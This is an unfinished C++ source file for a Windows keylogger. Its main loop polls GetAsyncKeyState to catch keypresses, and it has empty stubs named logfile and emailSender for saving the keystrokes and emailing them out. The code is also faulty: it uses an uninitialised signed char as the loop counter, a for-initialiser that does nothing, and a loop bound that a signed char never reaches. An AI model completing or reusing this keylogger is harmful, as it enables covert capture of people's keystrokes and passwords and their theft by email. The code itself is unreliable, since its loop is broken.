#include <iostream>
#include<fstream>
#include <Windows.h>
#include <time.h>






void logfile(int key)
{
	
	
	
	
}


void emailSender(std::string sender, std::fstream file, bool result)
{

}

int main()
{

	char i;
	bool running = true;
	while (running == true)
	{
		//using ascii
		for (i > 8; i <=255; i++) // starts and end of the mainly used ascii char
		{
			if (GetAsyncKeyState(i)==0)
			{
				continue;
			}
			if (GetAsyncKeyState(i)== -32767)
			{
				//TODO ADD the saving mechanishm

			}
		}
		

	}



	
	return 0;
}